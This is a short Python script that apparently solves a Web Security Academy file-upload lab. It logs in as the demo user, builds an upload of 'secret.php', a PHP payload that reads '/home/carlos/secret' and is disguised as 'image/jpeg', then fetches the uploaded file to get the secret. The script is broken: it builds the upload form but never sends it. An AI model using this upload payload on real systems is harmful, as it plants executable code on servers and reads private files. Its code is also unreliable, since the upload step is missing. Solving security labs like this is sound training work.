import requests
from bs4 import BeautifulSoup

site = 'ac441fce1ec0f402c058b3e700f4009a.web-security-academy.net'
s = requests.Session()


admin_url = f'https://{site}/my-account'
upload_url = f'https://{site}/my-account/avatar'

login_url = f'https://{site}/login'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)

multipart_form_data = {
    'csrf' : (None, 'Y6g0Pqet1J4LBQvDNrlP67m97Z2NK1Be'),
    'user' : (None, 'wiener'),
    'avatar' : ('secret.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'image/jpeg')
}
secret_url = f'https://{site}/files/avatars/secret.php'
resp = s.get(secret_url)
secret = resp.text
